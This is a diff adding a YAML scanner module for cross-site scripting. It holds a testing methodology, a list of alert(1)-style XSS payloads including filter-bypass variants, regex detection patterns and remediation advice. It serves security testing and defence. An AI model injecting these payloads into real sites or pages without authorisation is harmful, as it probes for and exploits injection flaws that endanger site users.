@@ -1,0 +1,86 @@
+name: Cross-Site Scripting
+category: web
+description: >
+  Detects reflected, stored, and DOM-based XSS vulnerabilities.
+  Tests for filter bypass and context-aware injection.
+
+severity_range: ["LOW", "MEDIUM", "HIGH"]
+tools: ["dalfox", "xsser", "custom_payloads", "curl"]
+
+methodology:
+  - "Map all reflection points: URL params, form fields, headers, cookies"
+  - "Test basic reflection with unique canary string (e.g., 'canary12345')"
+  - "Determine reflection context: HTML body, attribute, JS, CSS, URL"
+  - "Test HTML context: <script>alert(1)</script> and variants"
+  - "Test attribute context: \" onmouseover=alert(1) \""
+  - "Test JavaScript context: '-alert(1)-' and \";alert(1);//"
+  - "Test event handlers: onerror, onload, onfocus, onmouseover, onanimationstart"
+  - "Test SVG/MathML vectors: <svg onload=alert(1)>"
+  - "Test encoding bypasses: HTML entities, Unicode, URL encoding"
+  - "Test WAF/filter bypass: case variation, null bytes, nested tags"
+  - "Test DOM-based: check document.location, document.referrer, innerHTML sinks"
+  - "Verify execution in browser context (not just reflection)"
+
+payloads:
+  # Basic HTML context
+  - "<script>alert(1)</script>"
+  - "<img src=x onerror=alert(1)>"
+  - "<svg onload=alert(1)>"
+  - "<body onload=alert(1)>"
+  - "<details open ontoggle=alert(1)>"
+  # Attribute context
+  - "\" onmouseover=\"alert(1)\""
+  - "' onfocus='alert(1)' autofocus='"
+  - "\" onfocus=alert(1) autofocus x=\""
+  # JavaScript context
+  - "';alert(1)//"
+  - "\";alert(1);//"
+  - "</script><script>alert(1)</script>"
+  - "'-alert(1)-'"
+  # Event handlers
+  - "<img src=x onerror=alert(1)>"
+  - "<video src=x onerror=alert(1)>"
+  - "<audio src=x onerror=alert(1)>"
+  - "<marquee onstart=alert(1)>"
+  - "<input onfocus=alert(1) autofocus>"
+  # WAF bypass
+  - "<svg/onload=alert(1)>"
+  - "<svg onload=alert(1)//"
+  - "<img src=x onerror=alert`1`>"
+  - "<details open ontoggle=alert(1)>"
+  - "javascript:alert(1)"
+  - "<a href=javas&#99;ript:alert(1)>XSS</a>"
+
+detection_patterns:
+  - "<script[^>]*>.*?alert\\(.*?\\).*?</script>"
+  - "on(?:error|load|focus|mouseover|click|animationstart)\\s*=\\s*['\"]?alert"
+  - "javascript:\\s*alert"
+  - "<svg[^>]*onload\\s*="
+  - "<img[^>]*src\\s*=\\s*x[^>]*onerror\\s*="
+
+remediation: >
+  Implement context-aware output encoding (HTML, JS, URL, CSS contexts).
+  Use Content-Security-Policy (CSP) headers. Sanitize HTML with a proven
+  library (DOMPurify). Avoid innerHTML; use textContent. Set HttpOnly
+  and Secure flags on cookies. Use auto-escaping template engines.
+
+references:
+  - "CWE-79: Improper Neutralization of Input During Web Page Generation"
+  - "OWASP A03:2021 – Injection (XSS)"
+  - "OWASP XSS Prevention Cheat Sheet"
+  - "PortSwigger XSS"
+
+triggers:
+  - "xss"
+  - "javascript"
+  - "html"
+  - "template"
+  - "render"
+  - "dom"
+  - "react"
+  - "angular"
+  - "vue"
+  - "search"
+  - "comment"
+  - "profile"
+  - "form"
